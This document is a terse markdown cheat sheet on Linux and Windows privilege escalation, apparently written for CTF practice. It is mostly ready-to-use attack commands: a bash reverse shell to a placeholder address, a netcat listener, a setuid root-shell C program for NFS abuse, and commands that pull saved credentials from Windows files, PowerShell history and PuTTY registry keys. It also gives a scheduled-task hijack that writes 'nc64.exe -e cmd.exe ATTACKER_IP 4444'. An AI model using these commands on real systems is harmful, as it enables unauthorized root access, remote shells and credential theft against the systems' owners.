<font color= pink>Enumeration </font>is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. 



## Commands
- /proc/version - to find about system.



## Some Automation tools
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker



use CVE to exploit the kernel.
compile the exploit code and tranfer to victim using wget.
save code as .c and then compile it using gcc

gcc nfs.c -o nfs -w


use sudo -l to check which commands can be run without sudo


https://gtfobins.github.io/ 
- link to check how different commands can be used if given root access

reset; bash 1>&0 2>&0 getting root access


## Vulnerable binary
find / -type f -perm -04000 -ls 2>/dev/null


## Vulnerable getcap
getcap -r / 2>/dev/null

## CronJobs
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.

### Important for CTFS
check for /etc/crontab for cron jobs schedules
we could change the content of cronjob file to get reverse interactive shell
<br>
<font color= orange>bash -i >& /dev/tcp/ipaddress/port 0>&1</font>
<br>

<font color= orange>nc -lvp port to listen on incoming requests </font>




## PRivilege Escalation NFS
cat /etc/exports <br>
showmount -o victimip

mount -o rw victimip:/mountfolder /folder to be mounted


c script - <br>
int main()
{

    setgid(0);
    setuid(0);
    system("/bin/bash") ;
    return 0 ;
}

#### gcc nfs.c -o nfs -w



## Privilege escalation windows

C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

### command to check history 
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt


### saved windows credentials



to use unattended installations.

cmdkey /list<br>
runas /savecred /user:admin cmd.exe



putt session to get credential password
<br>
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s


## Scheduled task for binary exploitation
schtasks /query /tn vulntask /fo list /v
<br>
icacls c:\tasks\schtask.bat
<br>
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
<br>
 schtasks /run /tn vulntask

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls:


## adming access using running softwares
The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 



